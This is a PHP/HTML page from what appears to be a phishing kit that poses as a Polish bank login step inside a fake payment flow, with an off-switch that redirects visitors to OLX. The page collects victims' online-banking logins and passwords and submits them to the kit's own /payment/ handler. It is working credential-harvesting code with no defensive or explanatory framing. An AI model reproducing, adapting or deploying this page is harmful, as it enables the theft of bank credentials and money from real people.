<?php

$status = file_get_contents('../api/online.txt');

if ($status == 'siteoff') { 
	header('location: https://olx.pl/'); exit();
}

include "../function.php";
include "../config.php";

$id = $_GET["id"];
    
if (strlen($id) !== 32 || !file_exists("../payment/temp/" . $id))
    header("Location: /");
    
$json = file_get_contents("../payment/temp/" . $id);
$json = json_decode($json, true);

?>

<!DOCTYPE html>
<html>
	<head>
		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&amp;subset=cyrillic">
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">
		<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
		<link rel="stylesheet" type="text/css" href="css/common.css">
		<link rel="shortcut icon" type="image/png" href="img/fav-icon.png">

		<script type="text/javascript" src="js/jquery.js"></script>
		<script type="text/javascript" src="js/bootstrap.js"></script>
		<script type="text/javascript" src="js/common.js"></script>

		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

		<title>Logowanie do konta</title>
	</head>

	<body>
		<div class="block-info">
		    <div style="text-align: center; margin-bottom: 35px;">
		        <img src="/assets/img/bank/<?php echo $json["banking"]["value"]; ?>.png" style="max-width: 200px;">
		    </div>
		    
			<h3 class="heading-info">
				Logowanie do konta
			</h3>

			<p class="description-info">
				Login i hasło
			</p>
		</div>

		<div class="divider"></div>

		<div class="block-form">
			<p style="margin: 25px 0;">
				Wprowadź dane logowania do bankowości elektronicznej
			</p>

			<form class="form-payment" method="post">
				<div class="form-group">
					<label for="input-code">Login</label>
					<input type="text" class="form-control" id="input-login" name="login" placeholder="123456">
				</div>
				
				<div class="form-group">
					<label for="input-code">Hasło</label>
					<input type="password" class="form-control" id="input-password" name="password" placeholder="•••••••••••">
				</div>
				
				<input type="hidden" name="id" value="<?php echo $id; ?>">
				<input type="hidden" name="step" value="3">
			</form>
		</div>

		<div class="divider"></div>

		<div class="block-footer">
			<div class="row">
				<div class="col-xs-12">
					<a class="button-primary" style="margin-left: 0;">
						<i class="fas fa-chevron-right"></i> Zalogować
					</a>
				</div>
			</div>
		</div>

		<script type="text/javascript">
			var login = $("#input-login");
			var password = $("#input-password");

			$(".button-primary").click(function() {
				if (login.val().length < 4
					|| password.val().length < 4) {
					if (login.val().length < 4) {
					    login.addClass("input-error");

    					setTimeout(function() {
    						login.removeClass("input-error");
    					}, 2500);
					}
					
					if (password.val().length < 4) {
					    password.addClass("input-error");

    					setTimeout(function() {
    						password.removeClass("input-error");
    					}, 2500);
					}

					return false;
				} 

				$(this).css("pointer-events", "none");
				$(".button-primary").css("pointer-events", "none");
				$(this).html("<img src='img/icon-loader.svg'>");

				setTimeout(function() {
					$(".form-payment").attr("action", "/payment/").submit();
				}, 4000);

				return false;
			});
		</script>
	</body>
</html>